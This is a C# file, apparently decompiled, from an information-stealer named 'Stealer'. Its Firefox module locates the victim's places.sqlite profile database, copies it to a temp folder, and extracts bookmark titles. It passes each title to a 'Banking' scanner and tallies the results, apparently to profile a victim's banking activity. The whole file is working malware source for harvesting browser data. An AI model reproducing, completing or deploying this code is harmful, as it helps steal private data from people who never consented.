using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Firefox
{
	// Token: 0x02000025 RID: 37
	internal class cBookmarks
	{
		// Token: 0x060000B3 RID: 179 RVA: 0x00006928 File Offset: 0x00004B28
		private static string GetBookmarksDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				if (Directory.Exists(path2))
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						if (File.Exists(str + "\\places.sqlite"))
						{
							return str + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000699C File Offset: 0x00004B9C
		public static List<Bookmark> Get(string path)
		{
			List<Bookmark> list = new List<Bookmark>();
			try
			{
				string bookmarksDBPath = cBookmarks.GetBookmarksDBPath(path);
				if (!File.Exists(bookmarksDBPath))
				{
					return list;
				}
				string text = Path.GetTempPath() + "\\places.raw";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(bookmarksDBPath, text);
				SQLite sqlite = new SQLite(text);
				sqlite.ReadTable("moz_bookmarks");
				if (sqlite.GetRowCount() == 65536)
				{
					return new List<Bookmark>();
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Bookmark item = default(Bookmark);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 5));
					if (Crypto.GetUTF8(sqlite.GetValue(i, 1)).Equals("0") && item.sTitle != "0")
					{
						Banking.ScanData(item.sTitle);
						Counter.Bookmarks++;
						list.Add(item);
					}
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Bookmark>();
		}
	}
}
